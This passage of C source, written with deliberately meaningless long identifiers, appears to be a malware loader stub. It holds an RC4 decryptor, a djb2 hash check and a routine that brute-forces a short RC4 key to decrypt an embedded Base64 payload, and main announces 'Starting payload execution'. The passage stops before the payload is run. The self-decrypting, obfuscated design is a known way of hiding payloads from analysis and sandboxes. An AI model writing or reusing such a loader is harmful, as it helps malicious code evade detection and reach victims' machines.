        st->RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B = (st->RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B + st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54]) % 256;
        tgTy_wCrRNDhAE_8CIUeGFxG_EtxKUZFP4sDXe2fI = st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54];
        st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54] = st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[st->RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B];
        st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[st->RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B] = tgTy_wCrRNDhAE_8CIUeGFxG_EtxKUZFP4sDXe2fI;
        K = st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[(st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54] + st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[st->RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B]) % 256];
        P24r8E3ZfFF7Zo0lfhxeKe4gfF4bU0rz1NRnb_iTLv74qVFvp0arAPspE5rWyDCt2rWGcBx5ugz7U5qntDEM5Mru8YmjqqhnHT4AzMHx_4ROrizceDC9dq1Y1lrkIj3zRImoOl464RbbCgWfD5wdsGSj2_syuTYPkM4Hm7xBRutoC[rTeW4IYk53f6EhLmmXE0BxImufXXQ3rPh] ^= K;
    }
}


unsigned int TYIoPBzjktLmzZpa(const unsigned char *P24r8E3ZfFF7Zo0lfhxeKe4gfF4bU0rz1NRnb_iTLv74qVFvp0arAPspE5rWyDCt2rWGcBx5ugz7U5qntDEM5Mru8YmjqqhnHT4AzMHx_4ROrizceDC9dq1Y1lrkIj3zRImoOl464RbbCgWfD5wdsGSj2_syuTYPkM4Hm7xBRutoC, int qd244u_YEpOT_ZSMo9_UXFBOMvjk466S4X3Z57zDy41TC2yVR7hF9I5wB9djYxzOgHerNOmdMyWlzdIsY2ogqD5Lf2PlUHAO9WPjYkCCbiJ7djzzpTbwaxtYwPIDmzAYavru90EzLcL2w) {
    unsigned int wAbS1jjJsios7pnOC0Nx5SWxQIkXctNlK7eNJk = 5381;
    int pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54;
    
    for (pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = 0; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 < qd244u_YEpOT_ZSMo9_UXFBOMvjk466S4X3Z57zDy41TC2yVR7hF9I5wB9djYxzOgHerNOmdMyWlzdIsY2ogqD5Lf2PlUHAO9WPjYkCCbiJ7djzzpTbwaxtYwPIDmzAYavru90EzLcL2w; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54++) {
        wAbS1jjJsios7pnOC0Nx5SWxQIkXctNlK7eNJk = ((wAbS1jjJsios7pnOC0Nx5SWxQIkXctNlK7eNJk * 33) + P24r8E3ZfFF7Zo0lfhxeKe4gfF4bU0rz1NRnb_iTLv74qVFvp0arAPspE5rWyDCt2rWGcBx5ugz7U5qntDEM5Mru8YmjqqhnHT4AzMHx_4ROrizceDC9dq1Y1lrkIj3zRImoOl464RbbCgWfD5wdsGSj2_syuTYPkM4Hm7xBRutoC[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54]) & 0xFFFFFFFF;
    }
    return wAbS1jjJsios7pnOC0Nx5SWxQIkXctNlK7eNJk;
}


unsigned int yB8KqI2dfWNIiNP3KLo(const unsigned char *nsLh9XcLe4AQyEIuyrAnIY1jrmqkEpJiQHUZCeqxrmuKKXB_nTRQz5zqLtQggtUeMAF9WA6hRoO82If9hqN6DsdEGwiX8FtENayp1hf9TIpXyLy5ZksayP5et6mRPzptJBNDPMtusHzjRtIdvDZQF505E2BOj5eChGbAwJY94TlihXbvwLufyKzeiGVTFF_867wghB0oEMfVPVeFFzjhsH79HXqSHmg9OsIR94sFwuj2Q4hyv9OyMgt7W) {
    return (unsigned int)nsLh9XcLe4AQyEIuyrAnIY1jrmqkEpJiQHUZCeqxrmuKKXB_nTRQz5zqLtQggtUeMAF9WA6hRoO82If9hqN6DsdEGwiX8FtENayp1hf9TIpXyLy5ZksayP5et6mRPzptJBNDPMtusHzjRtIdvDZQF505E2BOj5eChGbAwJY94TlihXbvwLufyKzeiGVTFF_867wghB0oEMfVPVeFFzjhsH79HXqSHmg9OsIR94sFwuj2Q4hyv9OyMgt7W[0] | 
           ((unsigned int)nsLh9XcLe4AQyEIuyrAnIY1jrmqkEpJiQHUZCeqxrmuKKXB_nTRQz5zqLtQggtUeMAF9WA6hRoO82If9hqN6DsdEGwiX8FtENayp1hf9TIpXyLy5ZksayP5et6mRPzptJBNDPMtusHzjRtIdvDZQF505E2BOj5eChGbAwJY94TlihXbvwLufyKzeiGVTFF_867wghB0oEMfVPVeFFzjhsH79HXqSHmg9OsIR94sFwuj2Q4hyv9OyMgt7W[1] << 8) | 
           ((unsigned int)nsLh9XcLe4AQyEIuyrAnIY1jrmqkEpJiQHUZCeqxrmuKKXB_nTRQz5zqLtQggtUeMAF9WA6hRoO82If9hqN6DsdEGwiX8FtENayp1hf9TIpXyLy5ZksayP5et6mRPzptJBNDPMtusHzjRtIdvDZQF505E2BOj5eChGbAwJY94TlihXbvwLufyKzeiGVTFF_867wghB0oEMfVPVeFFzjhsH79HXqSHmg9OsIR94sFwuj2Q4hyv9OyMgt7W[2] << 16) | 
           ((unsigned int)nsLh9XcLe4AQyEIuyrAnIY1jrmqkEpJiQHUZCeqxrmuKKXB_nTRQz5zqLtQggtUeMAF9WA6hRoO82If9hqN6DsdEGwiX8FtENayp1hf9TIpXyLy5ZksayP5et6mRPzptJBNDPMtusHzjRtIdvDZQF505E2BOj5eChGbAwJY94TlihXbvwLufyKzeiGVTFF_867wghB0oEMfVPVeFFzjhsH79HXqSHmg9OsIR94sFwuj2Q4hyv9OyMgt7W[3] << 24);
}


int pudJCnqETeg7XQE2mRttBQqcrxh3dzCDSDyDctrcTKRm9ZSNrKjtH9xOUrO7_Qtmyb91tGsI_V4It19LCHf5_su_89xYQU5iJLyafsspsiB39zSeq1P3yjcpUFM8748zZvkR1lP4QdPNmocXmk4UgTLYZ79xLtRP_b7_ohI4vjCe1v7mzaG5PfsnJC7wYgeiAjzTJ(unsigned char *key, int K4l1fBGTQDf7zaHKXev_P3cNfNNyNI0F4fo8xgYtxr6p6tXF2TaH0dbnWzGyAfPxGsP0VFsh2vfFvVzOvs, int HGcVwGAnClUrD_tWDyisI2tJVH1RKCyhwW9WbhW5SXcc4DFL4A392Hfoh64JeFoa8X7IkTq6tBDe8Ry7zH3fZOrM9jwelWn2N5m, unsigned char *X4ORzBys6U6ZsClgNgOWLNbgKbMxNuTbojRA_7plNOm0MLPxPu3Jgbm5NL_iQXMyWMCnJBxVezCBmNJb36nVbYuqqmMt_LOrWCb1RK1eajfTPWnk_Antuaszlqt54PjXiX9LUsHJzQTmh4o8hK64lyPuhdAwXGWjb4Ee22Tj37pZ2yAp65YrqR2CV7owaIzI_s1HsGup64oX0gXAqHLq8HC_y7DCy6GQ6zb_OW6vP9_, int lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY, unsigned char *WiJEkVOeJF0XDQ0ZBTQZ1y7X_ZDfZNfdM4VsHpXq1CjhHGFXwrNWYn8kCUjMPjaRS09qulvXJVeqlYJemLAwXI8KvdtU98PjKRjnwFgzKI8C72DE9ye5fsi1lrrVkmeSLUHmr5sswBcPYzaAznT9AlJAHwYlUdt2DFDluZElOeIlpp_QblJ9g3RDq4PcXlIenO, int *yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy) {
    int pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54;
    AdbqFf1X1bmyctvndoVoauLvqNPYxGDCokhCZhxBN9oSd WOG_npHY8GZFAOJLRHBE1hYca6wQTs29xuOPbmBxr9A9quc0zkeEgAy3n5EcQDJOKQmmTIlzELDrRO41Yt1MwlTn6FZAVTcx1H7WR1iwfFPxwzHd7XGdWa9x5DPa1DJknjfsNhJzUKpwxWJGyBLRvvAVWvKXiau7nVVkF3o8Eu0uYrSKoiNmklOfN36znhDP9VqMkq0xI9OwNzA_P2HB9iXDUaRbeeRKlqe;
    unsigned int SVQPxs1ZSv_JnFcGacDFSyYt_jXrf0mTWucWtw8RbEi7J4DhcAAXQWssOD0IL5gwZaSr_mFe2c;
    unsigned int tKEJfhAqzuAgS7HY3KWLEM3_bUZ4aoV8nOF9FQ4LPOkjkvYkTxQhf7JNnuMxFBAKhMzOjTgh5yAYdrHujbUg7Rg3KbnKRvh8 = yB8KqI2dfWNIiNP3KLo(ttI7kXHpVcWaPRC8M8gHcfFyspB3dVgGczYadqFMNKrEey0PiERN_THiZuJdYqzNRT3eIOhIGYBFdatX7EJhmug);
    
    if (K4l1fBGTQDf7zaHKXev_P3cNfNNyNI0F4fo8xgYtxr6p6tXF2TaH0dbnWzGyAfPxGsP0VFsh2vfFvVzOvs == HGcVwGAnClUrD_tWDyisI2tJVH1RKCyhwW9WbhW5SXcc4DFL4A392Hfoh64JeFoa8X7IkTq6tBDe8Ry7zH3fZOrM9jwelWn2N5m) {
        unsigned char R9XYGejcONwHHkzen6_GKcJzLgrlESAFwxlWSOZH99bDtmpNSqyYjGX35puBYU2yRGRLP5FP9zaAYqcE5EUOnuK0iUaCoRcecEXYtiW_e7Sep44LVhS10IPy1lruF6G_g0XC7W3qm7S[8192];
        unsigned char DvCeTaYeR_nhCB1zpmg6CHw5jkhXnkCUHH4Jpz4V2rJtqfoCxD8VfulsxS3jsl0ioYBuco2tImt_L5i8WBadfIFqdK0JKOHLAE6jiidXJJI6xq2tI6fLBl1Wr_TkZTeoO2PbrQzqffijx48WaQX9thNtd9vJmmCIAOmJpB5OcCgpb48eaCGNa5KGADru[8192];
        
        
        if (KEY_SIZE == 1) {
            printf("[~] Testing RC4 key: %02x\n", key[0]);
        } else if (KEY_SIZE == 2) {
            printf("[~] Testing RC4 key: %02x%02x\n", key[0], key[1]);
        } else {
            printf("[~] Testing RC4 key: %02x%02x%02x\n", key[0], key[1], key[2]);
        }
        
        memcpy(R9XYGejcONwHHkzen6_GKcJzLgrlESAFwxlWSOZH99bDtmpNSqyYjGX35puBYU2yRGRLP5FP9zaAYqcE5EUOnuK0iUaCoRcecEXYtiW_e7Sep44LVhS10IPy1lruF6G_g0XC7W3qm7S, X4ORzBys6U6ZsClgNgOWLNbgKbMxNuTbojRA_7plNOm0MLPxPu3Jgbm5NL_iQXMyWMCnJBxVezCBmNJb36nVbYuqqmMt_LOrWCb1RK1eajfTPWnk_Antuaszlqt54PjXiX9LUsHJzQTmh4o8hK64lyPuhdAwXGWjb4Ee22Tj37pZ2yAp65YrqR2CV7owaIzI_s1HsGup64oX0gXAqHLq8HC_y7DCy6GQ6zb_OW6vP9_, lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY);
        ElFIpsBNwribGmv5hhz42TopG8LQZOnERxX5_XHgU2uSy0Ccuf(&WOG_npHY8GZFAOJLRHBE1hYca6wQTs29xuOPbmBxr9A9quc0zkeEgAy3n5EcQDJOKQmmTIlzELDrRO41Yt1MwlTn6FZAVTcx1H7WR1iwfFPxwzHd7XGdWa9x5DPa1DJknjfsNhJzUKpwxWJGyBLRvvAVWvKXiau7nVVkF3o8Eu0uYrSKoiNmklOfN36znhDP9VqMkq0xI9OwNzA_P2HB9iXDUaRbeeRKlqe, key, HGcVwGAnClUrD_tWDyisI2tJVH1RKCyhwW9WbhW5SXcc4DFL4A392Hfoh64JeFoa8X7IkTq6tBDe8Ry7zH3fZOrM9jwelWn2N5m);
        FbFCf7PeqmTblxEWfN5kxl8Ed6zybqV_Dub4IALSZrmC92Xm5d6sINAvg2lSeK2ozZsQNHQewNhVA6xDrW0oZQSAtuKZG8ETXxfSSY5Ed5CwVAVxh74JvdSo_r5HsMu7Ahi0la5XoFd4FWQMEYT3j9uf6A21Q2vShOFjkuyxmIxSw0hFi_tBwiY8Q8T9zikx(&WOG_npHY8GZFAOJLRHBE1hYca6wQTs29xuOPbmBxr9A9quc0zkeEgAy3n5EcQDJOKQmmTIlzELDrRO41Yt1MwlTn6FZAVTcx1H7WR1iwfFPxwzHd7XGdWa9x5DPa1DJknjfsNhJzUKpwxWJGyBLRvvAVWvKXiau7nVVkF3o8Eu0uYrSKoiNmklOfN36znhDP9VqMkq0xI9OwNzA_P2HB9iXDUaRbeeRKlqe, R9XYGejcONwHHkzen6_GKcJzLgrlESAFwxlWSOZH99bDtmpNSqyYjGX35puBYU2yRGRLP5FP9zaAYqcE5EUOnuK0iUaCoRcecEXYtiW_e7Sep44LVhS10IPy1lruF6G_g0XC7W3qm7S, lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY);
        
        
        int un0fWQZx04Nqb64Of = wXyPBuf4OjUCftNqFlrEfQ0jLUd2jTCL29D7synW9dx3G4w1VMIahiF0AjAziY8hXELoQ7t4USvSXjLO_aUqPlAOD1sH8N3uC5QD45XtpVxs3r1QyRCwT6iiPkdm_0yoAr3e1JoixyC4TMfc3iAM2SF7efmn7218nqvntvmiCtMnk7ny4ClfAhKMJIlfWGYMdJAaObiUXetG19wwRzqebyT0y3axthpd4uj5jD5vk99l(R9XYGejcONwHHkzen6_GKcJzLgrlESAFwxlWSOZH99bDtmpNSqyYjGX35puBYU2yRGRLP5FP9zaAYqcE5EUOnuK0iUaCoRcecEXYtiW_e7Sep44LVhS10IPy1lruF6G_g0XC7W3qm7S, lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY, DvCeTaYeR_nhCB1zpmg6CHw5jkhXnkCUHH4Jpz4V2rJtqfoCxD8VfulsxS3jsl0ioYBuco2tImt_L5i8WBadfIFqdK0JKOHLAE6jiidXJJI6xq2tI6fLBl1Wr_TkZTeoO2PbrQzqffijx48WaQX9thNtd9vJmmCIAOmJpB5OcCgpb48eaCGNa5KGADru, 8192);
        
        if (un0fWQZx04Nqb64Of > 0) {
            
            printf("[~] Validating hash\n");
            unsigned char QfkoYqJTHWKd2feph5KWm1gQCUIIHUa6vcNCv_0kT_Ouv2SwSzF7rdycjXy13qVFqnHbxX6UK7NSNVAq1HZvGCHbEsDLGUqLcUcRhz1jyosbUY1SuuHp7ILDN0qB6aaMwDw_yz[8192];
            memcpy(QfkoYqJTHWKd2feph5KWm1gQCUIIHUa6vcNCv_0kT_Ouv2SwSzF7rdycjXy13qVFqnHbxX6UK7NSNVAq1HZvGCHbEsDLGUqLcUcRhz1jyosbUY1SuuHp7ILDN0qB6aaMwDw_yz, DvCeTaYeR_nhCB1zpmg6CHw5jkhXnkCUHH4Jpz4V2rJtqfoCxD8VfulsxS3jsl0ioYBuco2tImt_L5i8WBadfIFqdK0JKOHLAE6jiidXJJI6xq2tI6fLBl1Wr_TkZTeoO2PbrQzqffijx48WaQX9thNtd9vJmmCIAOmJpB5OcCgpb48eaCGNa5KGADru, un0fWQZx04Nqb64Of);
            int KH0SdVNt0pRbBI0HElnW2s2zmCWGyrJ1OFBmyv41ZGTuTYpiT9oZZJicRgEzZ_9hHSLYFJe7JbIpx4pwKje07fXVtq7sbp4D16Lx7daEPe3qspV5xVOo6CitZ56ZFk2K0vwAu1tzj2Ze17h5yUHjknmxdU1Pa1tUoq8x2Y7xTUq1cRs09W3 = sizeof(XT0Aal6vHAjg7duPVYuvvx_xWF0NE0wmm99Iw5MjJNY2QMVLdxLaUb9PSF6K46NAGb2MZcZyz_CygkMfmzoPfz1uyU8jsrEZd_3mlVCFwqa5KRMCnAQVa8gX_HyUwHK8rgc3AaeN73UlX07tzGReLolkXGt37c_0Ihbyr_EOkkQ8Y3uqxSoNP6Vi9XIwdqPV_Tc) - 1;
            memcpy(QfkoYqJTHWKd2feph5KWm1gQCUIIHUa6vcNCv_0kT_Ouv2SwSzF7rdycjXy13qVFqnHbxX6UK7NSNVAq1HZvGCHbEsDLGUqLcUcRhz1jyosbUY1SuuHp7ILDN0qB6aaMwDw_yz + un0fWQZx04Nqb64Of, XT0Aal6vHAjg7duPVYuvvx_xWF0NE0wmm99Iw5MjJNY2QMVLdxLaUb9PSF6K46NAGb2MZcZyz_CygkMfmzoPfz1uyU8jsrEZd_3mlVCFwqa5KRMCnAQVa8gX_HyUwHK8rgc3AaeN73UlX07tzGReLolkXGt37c_0Ihbyr_EOkkQ8Y3uqxSoNP6Vi9XIwdqPV_Tc, KH0SdVNt0pRbBI0HElnW2s2zmCWGyrJ1OFBmyv41ZGTuTYpiT9oZZJicRgEzZ_9hHSLYFJe7JbIpx4pwKje07fXVtq7sbp4D16Lx7daEPe3qspV5xVOo6CitZ56ZFk2K0vwAu1tzj2Ze17h5yUHjknmxdU1Pa1tUoq8x2Y7xTUq1cRs09W3);
            
            
            SVQPxs1ZSv_JnFcGacDFSyYt_jXrf0mTWucWtw8RbEi7J4DhcAAXQWssOD0IL5gwZaSr_mFe2c = TYIoPBzjktLmzZpa(QfkoYqJTHWKd2feph5KWm1gQCUIIHUa6vcNCv_0kT_Ouv2SwSzF7rdycjXy13qVFqnHbxX6UK7NSNVAq1HZvGCHbEsDLGUqLcUcRhz1jyosbUY1SuuHp7ILDN0qB6aaMwDw_yz, un0fWQZx04Nqb64Of + KH0SdVNt0pRbBI0HElnW2s2zmCWGyrJ1OFBmyv41ZGTuTYpiT9oZZJicRgEzZ_9hHSLYFJe7JbIpx4pwKje07fXVtq7sbp4D16Lx7daEPe3qspV5xVOo6CitZ56ZFk2K0vwAu1tzj2Ze17h5yUHjknmxdU1Pa1tUoq8x2Y7xTUq1cRs09W3);
            
            if (SVQPxs1ZSv_JnFcGacDFSyYt_jXrf0mTWucWtw8RbEi7J4DhcAAXQWssOD0IL5gwZaSr_mFe2c == tKEJfhAqzuAgS7HY3KWLEM3_bUZ4aoV8nOF9FQ4LPOkjkvYkTxQhf7JNnuMxFBAKhMzOjTgh5yAYdrHujbUg7Rg3KbnKRvh8) {
                if (KEY_SIZE == 1) {
                    printf("[+] Valid key found: %02x\n", key[0]);
                } else if (KEY_SIZE == 2) {
                    printf("[+] Valid key found: %02x%02x\n", key[0], key[1]);
                } else {
                    printf("[+] Valid key found: %02x%02x%02x\n", key[0], key[1], key[2]);
                }
                memcpy(WiJEkVOeJF0XDQ0ZBTQZ1y7X_ZDfZNfdM4VsHpXq1CjhHGFXwrNWYn8kCUjMPjaRS09qulvXJVeqlYJemLAwXI8KvdtU98PjKRjnwFgzKI8C72DE9ye5fsi1lrrVkmeSLUHmr5sswBcPYzaAznT9AlJAHwYlUdt2DFDluZElOeIlpp_QblJ9g3RDq4PcXlIenO, DvCeTaYeR_nhCB1zpmg6CHw5jkhXnkCUHH4Jpz4V2rJtqfoCxD8VfulsxS3jsl0ioYBuco2tImt_L5i8WBadfIFqdK0JKOHLAE6jiidXJJI6xq2tI6fLBl1Wr_TkZTeoO2PbrQzqffijx48WaQX9thNtd9vJmmCIAOmJpB5OcCgpb48eaCGNa5KGADru, un0fWQZx04Nqb64Of);
                *yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy = un0fWQZx04Nqb64Of;
                return 1;
            }
        }
        return 0;
    }
    
    
    for (pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = 1; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 <= 255; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54++) {
        key[K4l1fBGTQDf7zaHKXev_P3cNfNNyNI0F4fo8xgYtxr6p6tXF2TaH0dbnWzGyAfPxGsP0VFsh2vfFvVzOvs] = (unsigned char)pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54;
        if (pudJCnqETeg7XQE2mRttBQqcrxh3dzCDSDyDctrcTKRm9ZSNrKjtH9xOUrO7_Qtmyb91tGsI_V4It19LCHf5_su_89xYQU5iJLyafsspsiB39zSeq1P3yjcpUFM8748zZvkR1lP4QdPNmocXmk4UgTLYZ79xLtRP_b7_ohI4vjCe1v7mzaG5PfsnJC7wYgeiAjzTJ(key, K4l1fBGTQDf7zaHKXev_P3cNfNNyNI0F4fo8xgYtxr6p6tXF2TaH0dbnWzGyAfPxGsP0VFsh2vfFvVzOvs + 1, HGcVwGAnClUrD_tWDyisI2tJVH1RKCyhwW9WbhW5SXcc4DFL4A392Hfoh64JeFoa8X7IkTq6tBDe8Ry7zH3fZOrM9jwelWn2N5m, X4ORzBys6U6ZsClgNgOWLNbgKbMxNuTbojRA_7plNOm0MLPxPu3Jgbm5NL_iQXMyWMCnJBxVezCBmNJb36nVbYuqqmMt_LOrWCb1RK1eajfTPWnk_Antuaszlqt54PjXiX9LUsHJzQTmh4o8hK64lyPuhdAwXGWjb4Ee22Tj37pZ2yAp65YrqR2CV7owaIzI_s1HsGup64oX0gXAqHLq8HC_y7DCy6GQ6zb_OW6vP9_, lxKcjUFbWHkbHD9JOEiVCaKlmR3yPXyU1zhndFrfxDNbZCUTU6WHUTg2O73L2LY, WiJEkVOeJF0XDQ0ZBTQZ1y7X_ZDfZNfdM4VsHpXq1CjhHGFXwrNWYn8kCUjMPjaRS09qulvXJVeqlYJemLAwXI8KvdtU98PjKRjnwFgzKI8C72DE9ye5fsi1lrrVkmeSLUHmr5sswBcPYzaAznT9AlJAHwYlUdt2DFDluZElOeIlpp_QblJ9g3RDq4PcXlIenO, yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    printf("[~] Starting payload execution\n");
    unsigned char key[KEY_SIZE];
    unsigned char WiJEkVOeJF0XDQ0ZBTQZ1y7X_ZDfZNfdM4VsHpXq1CjhHGFXwrNWYn8kCUjMPjaRS09qulvXJVeqlYJemLAwXI8KvdtU98PjKRjnwFgzKI8C72DE9ye5fsi1lrrVkmeSLUHmr5sswBcPYzaAznT9AlJAHwYlUdt2DFDluZElOeIlpp_QblJ9g3RDq4PcXlIenO[8192];
    unsigned char X4ORzBys6U6ZsClgNgOWLNbgKbMxNuTbojRA_7plNOm0MLPxPu3Jgbm5NL_iQXMyWMCnJBxVezCBmNJb36nVbYuqqmMt_LOrWCb1RK1eajfTPWnk_Antuaszlqt54PjXiX9LUsHJzQTmh4o8hK64lyPuhdAwXGWjb4Ee22Tj37pZ2yAp65YrqR2CV7owaIzI_s1HsGup64oX0gXAqHLq8HC_y7DCy6GQ6zb_OW6vP9_[8192];
    int bp8mitSf2Ntplq05oCe8WZJs5ZYLWWwMo51wh2MUJoYmhQ_tZL9nC0F8DMUdiJIYSvbb = sizeof(skpEYVo4jEJrKBjMpUVe8csDD53Ze84Q2BmS6S3i8RTXL4Rbar18RT_vvX7xICksJBuVfMwojvrm_EnbbH37gBAZcjc6zPTQj1ddfmIaRnteLgdRMq8RRG0KQpnfFN_bOQSVoKS7_SyCkzps9ymP6BhCeUUeUxi73Bui7q0d2qOz4JikshM2cmhufiKEFPqps7T9KIh) - 1;
    int yyjBgCbb4Px0JsAeX5GnTk5cK8oEmwSZENlRJtvtYjDbPxlYduV0OWox62VWADtJgq8HWUeu2lhM6kH6_ja1IColh7Jxv3yrMGrCivdRiNo1L0uegtYWIkMgp8tIEyN7aWrUtSmBdBmjTDrDK6YJdXzSrFPgTAlTtKf74W9WsmPrSIFSA2KDWdGy = 0;
    int hOeZhEI2zEhBWhrOhggz9Y61vnFkU6Wbl6QrQHf_KzFuhC4X2zRm3rt81WqJnVUFpdH2LyuGC9uzZFwFKhycO = 0;
    
    printf("[~] RC4 key size: %d bytes\n", KEY_SIZE);
    printf("[~] Base64 payload size: %d bytes\n", bp8mitSf2Ntplq05oCe8WZJs5ZYLWWwMo51wh2MUJoYmhQ_tZL9nC0F8DMUdiJIYSvbb);
    
    
